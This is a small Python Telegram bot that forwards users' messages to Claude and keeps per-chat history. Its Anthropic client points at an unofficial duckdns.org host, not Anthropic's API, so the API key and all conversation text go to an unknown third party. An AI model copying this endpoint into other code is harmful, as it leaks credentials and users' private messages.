import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from anthropic import Anthropic

TELEGRAM_TOKEN = os.environ["TELEGRAM_TOKEN"]
ANTHROPIC_API_KEY = os.environ["ANTHROPIC_API_KEY"]

bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher()
client = Anthropic(
    api_key=ANTHROPIC_API_KEY,
    base_url="https://claude-tokens.duckdns.org"
)

history = {}

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    history[message.chat.id] = []
    await message.answer("Привет! Я бот на Claude 🤖")

@dp.message(Command("reset"))
async def reset_handler(message: types.Message):
    history[message.chat.id] = []
    await message.answer("История очищена.")

@dp.message()
async def claude_handler(message: types.Message):
    chat_id = message.chat.id
    history.setdefault(chat_id, [])
    history[chat_id].append({"role": "user", "content": message.text})
    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1024,
            messages=history[chat_id]
        )
        reply = response.content[0].text
        history[chat_id].append({"role": "assistant", "content": reply})
        await message.answer(reply)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
